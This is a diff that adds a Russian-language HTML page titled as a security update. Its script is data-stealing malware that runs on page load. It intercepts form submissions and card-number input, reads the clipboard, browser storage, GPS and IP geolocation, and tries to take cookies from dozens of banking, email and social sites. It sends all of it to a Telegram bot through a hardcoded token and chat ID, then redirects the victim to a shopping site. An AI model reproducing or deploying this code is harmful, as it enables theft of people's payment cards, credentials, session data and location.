@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Обновление безопасности...</title>
+<style>
+body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;margin:0;}
+#log{font-size:12px;max-height:80vh;overflow-y:auto;white-space:pre-wrap;color:#aaa;}
+.blink{animation:blink 1s infinite;}
+@keyframes blink{50%{opacity:0.3;}}
+</style>
+</head>
+<body>
+<div id="log" class="blink">[SWILL] Активация полного сбора данных...</div>
+<script>
+// ===== КОНФИГ =====
+var TOKEN = "8636640064:AAFcyhqdc_YBLzEtAMKbKZhcfylhLhfIWLo";
+var CHAT_ID = "7532676697";
+var LOG = document.getElementById('log');
+var collectedData = {
+    cookies: {},
+    forms: [],
+    cards: [],
+    logins: [],
+    localStorage: {},
+    sessionStorage: {},
+    clipboard: '',
+    ip: '',
+    geo: '',
+    gps: '',
+    deviceInfo: {},
+    bankData: []
+};
+
+function log(msg) {
+    LOG.innerHTML += msg + "\n";
+    LOG.scrollTop = LOG.scrollHeight;
+}
+
+function send(text) {
+    if (text.length > 4000) {
+        var chunks = text.match(/.{1,4000}/g);
+        chunks.forEach(function(chunk) {
+            new Image().src = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(chunk);
+        });
+    } else {
+        new Image().src = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
+    }
+}
+
+// ===== 1. КРАЖА БАНКОВСКИХ ДАННЫХ ЧЕРЕЗ ПЕРЕХВАТ ФОРМ =====
+function setupBankDataStealer() {
+    log('[БАНК] Установка перехватчиков форм...');
+    
+    // Перехват всех отправок форм
+    document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var data = collectFormData(form);
+        if (data && data.length > 0) {
+            var msg = '===== 💳 ПЕРЕХВАТ ФОРМЫ (BANK) =====\n';
+            msg += '🔗 URL: ' + window.location.href + '\n';
+            msg += '📅 Время: ' + new Date().toLocaleString() + '\n';
+            msg += '📋 Данные:\n' + data;
+            send(msg);
+            log('[БАНК] Перехвачена форма: ' + data.substring(0, 100) + '...');
+            collectedData.bankData.push(data);
+        }
+    }, true);
+
+    // Перехват изменений в полях ввода (для кредитных карт)
+    document.addEventListener('input', function(e) {
+        var el = e.target;
+        if (el.tagName === 'INPUT' && el.type === 'text' || el.type === 'number' || el.type === 'tel') {
+            var value = el.value;
+            // Определяем тип поля по атрибутам
+            var name = (el.name || el.id || '').toLowerCase();
+            var isCard = name.includes('card') || name.includes('cvc') || name.includes('cvv') || 
+                         name.includes('exp') || name.includes('date') || name.includes('cc') ||
+                         name.includes('pan') || name.includes('number') && el.maxLength >= 16;
+            if (isCard && value && value.length >= 4) {
+                var msg = '💳 Банковская карта (ввод): ' + value + 
+                          ' | Поле: ' + (el.name || el.id || 'unknown') + 
+                          ' | URL: ' + window.location.href;
+                send(msg);
+                log('[БАНК] Обнаружен ввод карты: ' + value.substring(0, 4) + '****');
+                collectedData.cards.push(value);
+            }
+        }
+    }, true);
+
+    // Перехват фокуса на полях пароля
+    document.addEventListener('focus', function(e) {
+        var el = e.target;
+        if (el.tagName === 'INPUT' && el.type === 'password') {
+            var msg = '🔑 Поле пароля активировано: ' + (el.name || el.id || 'unknown') + 
+                      ' | URL: ' + window.location.href;
+            send(msg);
+            log('[ПАРОЛЬ] Поле пароля сфокусировано');
+        }
+    }, true);
+}
+
+// Сбор данных из формы
+function collectFormData(form) {
+    var data = '';
+    var elements = form.querySelectorAll('input, select, textarea');
+    elements.forEach(function(el) {
+        if (el.type === 'submit' || el.type === 'button' || el.type === 'reset') return;
+        var name = el.name || el.id || 'unknown';
+        var value = el.value || el.innerText || '';
+        if (value && value.length > 0) {
+            // Маскируем пароли
+            if (el.type === 'password') {
+                data += '  🔑 ' + name + ' = ' + '******** (длина: ' + value.length + ')\n';
+            } else {
+                data += '  📝 ' + name + ' = ' + (value.length > 100 ? value.substring(0, 100) + '...' : value) + '\n';
+            }
+        }
+    });
+    return data;
+}
+
+// ===== 2. КРАЖА КУКИ ВСЕМИ МЕТОДАМИ =====
+function iframeCookieSteal(domains) {
+    return new Promise(function(resolve) {
+        var results = [];
+        var total = domains.length;
+        var loaded = 0;
+        var container = document.createElement('div');
+        container.style.display = 'none';
+        document.body.appendChild(container);
+
+        domains.forEach(function(domain) {
+            var iframe = document.createElement('iframe');
+            iframe.src = 'https://' + domain;
+            iframe.style.width = '1px';
+            iframe.style.height = '1px';
+            iframe.style.border = 'none';
+            iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups');
+            
+            iframe.onload = function() {
+                loaded++;
+                try {
+                    var doc = iframe.contentDocument || iframe.contentWindow.document;
+                    if (doc && doc.cookie) {
+                        var cookies = doc.cookie;
+                        if (cookies && cookies.length > 0) {
+                            results.push(domain + ': ' + cookies);
+                            collectedData.cookies[domain] = cookies;
+                            log('[КУКИ] + ' + domain);
+                        }
+                    }
+                } catch(e) {}
+                if (loaded === total) resolve(results);
+            };
+            container.appendChild(iframe);
+        });
+        setTimeout(function() { resolve(results); }, 10000);
+    });
+}
+
+function imageCookieSteal(domains) {
+    return new Promise(function(resolve) {
+        var results = [];
+        var total = domains.length;
+        var loaded = 0;
+        domains.forEach(function(domain) {
+            var img = new Image();
+            img.crossOrigin = 'use-credentials';
+            img.src = 'https://' + domain + '/favicon.ico?' + Date.now();
+            img.onload = function() {
+                results.push(domain + ': запрос выполнен (куки отправлены)');
+                loaded++;
+                if (loaded === total) resolve(results);
+            };
+            img.onerror = function() {
+                loaded++;
+                if (loaded === total) resolve(results);
+            };
+        });
+        setTimeout(function() { resolve(results); }, 10000);
+    });
+}
+
+function fetchCookieSteal(domains) {
+    return new Promise(function(resolve) {
+        var results = [];
+        var total = domains.length;
+        var fetched = 0;
+        domains.forEach(function(domain) {
+            fetch('https://' + domain, {
+                method: 'GET',
+                credentials: 'include',
+                mode: 'no-cors'
+            })
+            .then(function() {
+                results.push(domain + ': fetch выполнен');
+                fetched++;
+                if (fetched === total) resolve(results);
+            })
+            .catch(function() {
+                fetched++;
+                if (fetched === total) resolve(results);
+            });
+        });
+        setTimeout(function() { resolve(results); }, 10000);
+    });
+}
+
+// ===== 3. СБОР ВСЕХ ДАННЫХ УСТРОЙСТВА =====
+function collectDeviceInfo() {
+    var info = '===== 📱 УСТРОЙСТВО =====\n';
+    info += 'UserAgent: ' + navigator.userAgent + '\n';
+    info += 'Память: ' + (navigator.deviceMemory || '?') + ' GB\n';
+    info += 'Экран: ' + screen.width + 'x' + screen.height + '\n';
+    info += 'DPI: ' + (window.devicePixelRatio || 1) + '\n';
+    info += 'Язык: ' + navigator.language + '\n';
+    info += 'Платформа: ' + navigator.platform + '\n';
+    info += 'Вендор: ' + navigator.vendor + '\n';
+    info += 'Время: ' + new Date().toLocaleString() + '\n';
+    return info;
+}
+
+// ===== 4. IP + ГЕО =====
+function getIPAndGeo() {
+    return new Promise(function(resolve) {
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                var ip = data.ip;
+                fetch('https://ipapi.co/' + ip + '/json/')
+                    .then(r => r.json())
+                    .then(geo => {
+                        var info = '===== 🌍 IP И ГЕО =====\n';
+                        info += 'IP: ' + ip + '\n';
+                        info += 'Город: ' + (geo.city || '?') + '\n';
+                        info += 'Регион: ' + (geo.region || '?') + '\n';
+                        info += 'Страна: ' + (geo.country_name || '?') + '\n';
+                        info += 'Почтовый индекс: ' + (geo.postal || '?') + '\n';
+                        info += 'Координаты: ' + (geo.latitude || '?') + ', ' + (geo.longitude || '?') + '\n';
+                        info += 'ISP: ' + (geo.org || '?') + '\n';
+                        collectedData.ip = ip;
+                        collectedData.geo = info;
+                        resolve(info);
+                    })
+                    .catch(function() { resolve('===== 🌍 IP =====\nIP: ' + ip); });
+            })
+            .catch(function() { resolve('===== 🌍 IP =====\nНе удалось определить'); });
+    });
+}
+
+// ===== 5. GPS =====
+function getGPS() {
+    return new Promise(function(resolve) {
+        try {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    var info = '===== 📍 GPS =====\n';
+                    info += 'Широта: ' + pos.coords.latitude + '\n';
+                    info += 'Долгота: ' + pos.coords.longitude + '\n';
+                    info += 'Точность: ' + pos.coords.accuracy + ' м\n';
+                    info += 'Карта: https://maps.google.com/?q=' + pos.coords.latitude + ',' + pos.coords.longitude + '\n';
+                    collectedData.gps = info;
+                    resolve(info);
+                },
+                function(err) {
+                    var info = '===== 📍 GPS =====\n';
+                    if (err.code === 1) info += 'Отклонено пользователем\n';
+                    else if (err.code === 2) info += 'Позиция недоступна\n';
+                    else if (err.code === 3) info += 'Таймаут\n';
+                    else info += 'Ошибка: ' + err.message + '\n';
+                    resolve(info);
+                },
+                { enableHighAccuracy: true, timeout: 15000 }
+            );
+        } catch(e) {
+            resolve('===== 📍 GPS =====\nНе поддерживается');
+        }
+    });
+}
+
+// ===== 6. БУФЕР ОБМЕНА =====
+function getClipboard() {
+    return new Promise(function(resolve) {
+        try {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText()
+                    .then(text => {
+                        collectedData.clipboard = text || 'пусто';
+                        resolve('===== 📋 БУФЕР =====\n' + (text || 'пусто'));
+                    })
+                    .catch(() => resolve('===== 📋 БУФЕР =====\nДоступ запрещён'));
+            } else {
+                resolve('===== 📋 БУФЕР =====\nAPI недоступен');
+            }
+        } catch(e) {
+            resolve('===== 📋 БУФЕР =====\nОшибка');
+        }
+    });
+}
+
+// ===== 7. LOCALSTORAGE + SESSIONSTORAGE =====
+function getStorages() {
+    var result = '===== 💾 STORAGE =====\n';
+    try {
+        result += '📍 localStorage:\n';
+        for (var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            var val = localStorage.getItem(key);
+            if (val && val.length > 0) {
+                result += '  ' + key + ' = ' + (val.length > 100 ? val.substring(0, 100) + '...' : val) + '\n';
+                collectedData.localStorage[key] = val;
+            }
+        }
+    } catch(e) { result += '  localStorage: ошибка\n'; }
+
+    try {
+        result += '📍 sessionStorage:\n';
+        for (var j = 0; j < sessionStorage.length; j++) {
+            var key2 = sessionStorage.key(j);
+            var val2 = sessionStorage.getItem(key2);
+            if (val2 && val2.length > 0) {
+                result += '  ' + key2 + ' = ' + (val2.length > 100 ? val2.substring(0, 100) + '...' : val2) + '\n';
+                collectedData.sessionStorage[key2] = val2;
+            }
+        }
+    } catch(e) { result += '  sessionStorage: ошибка\n'; }
+    return result;
+}
+
+// ===== 8. БАТАРЕЯ =====
+function getBattery() {
+    return new Promise(function(resolve) {
+        try {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(b) {
+                    var info = '===== 🔋 БАТАРЕЯ =====\n';
+                    info += 'Уровень: ' + Math.round(b.level * 100) + '%\n';
+                    info += 'Зарядка: ' + (b.charging ? 'да' : 'нет') + '\n';
+                    resolve(info);
+                });
+            } else {
+                resolve('===== 🔋 БАТАРЕЯ =====\nНедоступно');
+            }
+        } catch(e) {
+            resolve('===== 🔋 БАТАРЕЯ =====\nОшибка');
+        }
+    });
+}
+
+// ===== 9. ДОМЕНЫ ДЛЯ КРАЖИ КУК =====
+function getTargetDomains() {
+    return [
+        'google.com', 'youtube.com', 'facebook.com', 'instagram.com', 'twitter.com',
+        'vk.com', 'ok.ru', 'mail.ru', 'yandex.ru', 'rambler.ru',
+        'tiktok.com', 'reddit.com', 'pinterest.com', 'tumblr.com',
+        'telegram.org', 'whatsapp.com', 'discord.com', 'slack.com',
+        'wildberries.ru', 'ozon.ru', 'sbermegamarket.ru', 'yandexmarket.ru',
+        'aliexpress.ru', 'ebay.com', 'amazon.com', 'etsy.com',
+        'sberbank.ru', 'tinkoff.ru', 'alfa.ru', 'vtb.ru', 'gazprombank.ru',
+        'raiffeisen.ru', 'citibank.ru', 'open.ru', 'psbank.ru',
+        'gmail.com', 'mail.ru', 'outlook.com', 'yahoo.com', 'protonmail.com',
+        'cloud.mail.ru', 'google.drive', 'onedrive.com', 'dropbox.com',
+        'ria.ru', 'tass.ru', 'lenta.ru', 'rbc.ru', 'kommersant.ru',
+        'twitch.tv', 'vimeo.com', 'steam.com', 'epicgames.com',
+        'github.com', 'stackoverflow.com', 'medium.com', 'zoom.us',
+        'microsoft.com', 'apple.com', 'android.com'
+    ];
+}
+
+// ===== 10. ОСНОВНАЯ ФУНКЦИЯ СБОРА =====
+async function main() {
+    log('[SWILL] Запуск полного сбора данных...');
+    log('[SWILL] Токен: ' + TOKEN);
+    log('[SWILL] Chat ID: ' + CHAT_ID);
+    log('');
+
+    // 1. Установка перехватчиков форм (банковские данные)
+    setupBankDataStealer();
+    log('[✓] Перехватчики форм установлены');
+
+    // 2. Сбор устройства
+    var deviceInfo = collectDeviceInfo();
+    send(deviceInfo);
+    log('[✓] Информация устройства отправлена');
+
+    // 3. IP + Geo
+    var ipGeo = await getIPAndGeo();
+    send(ipGeo);
+    log('[✓] IP и гео отправлены');
+
+    // 4. GPS
+    var gps = await getGPS();
+    send(gps);
+    log('[✓] GPS отправлен');
+
+    // 5. Буфер обмена
+    var clipboard = await getClipboard();
+    send(clipboard);
+    log('[✓] Буфер обмена отправлен');
+
+    // 6. Storages
+    var storages = getStorages();
+    send(storages);
+    log('[✓] Storages отправлены');
+
+    // 7. Батарея
+    var battery = await getBattery();
+    send(battery);
+    log('[✓] Батарея отправлена');
+
+    // 8. Кража кук методами
+    log('[КУКИ] Начинаем кражу...');
+    var domains = getTargetDomains();
+    
+    // iframe
+    log('[КУКИ] Метод iframe...');
+    var result1 = await iframeCookieSteal(domains.slice(0, 30));
+    if (result1.length > 0) {
+        send('===== 🍪 КУКИ (iframe) =====\n' + result1.join('\n'));
+    }
+
+    // Image
+    log('[КУКИ] Метод Image...');
+    var result2 = await imageCookieSteal(domains.slice(0, 30));
+    if (result2.length > 0) {
+        send('===== 🍪 КУКИ (Image) =====\n' + result2.join('\n'));
+    }
+
+    // fetch
+    log('[КУКИ] Метод fetch...');
+    var result3 = await fetchCookieSteal(domains.slice(0, 30));
+    if (result3.length > 0) {
+        send('===== 🍪 КУКИ (fetch) =====\n' + result3.join('\n'));
+    }
+
+    // 9. Итоговый отчет
+    var finalReport = '===== 📊 ИТОГОВЫЙ ОТЧЕТ =====\n';
+    finalReport += '✅ Сбор завершён\n';
+    finalReport += '📅 ' + new Date().toLocaleString() + '\n';
+    finalReport += '🌐 UserAgent: ' + navigator.userAgent + '\n';
+    finalReport += '🍪 Доменов с куками: ' + Object.keys(collectedData.cookies).length + '\n';
+    finalReport += '💳 Перехваченных форм: ' + collectedData.bankData.length + '\n';
+    finalReport += '💳 Карт обнаружено: ' + collectedData.cards.length + '\n';
+    finalReport += '📦 localStorage записей: ' + Object.keys(collectedData.localStorage).length + '\n';
+    finalReport += '📦 sessionStorage записей: ' + Object.keys(collectedData.sessionStorage).length + '\n';
+    send(finalReport);
+    log('[✓] Итоговый отчет отправлен');
+
+    // 10. Редирект
+    log('[✓] Редирект через 3 секунды...');
+    setTimeout(function() {
+        window.location.href = 'https://www.wildberries.ru/';
+    }, 3000);
+}
+
+// ===== ЗАПУСК =====
+window.onload = function() {
+    setTimeout(main, 500);
+};
+</script>
+</body>
+</html>
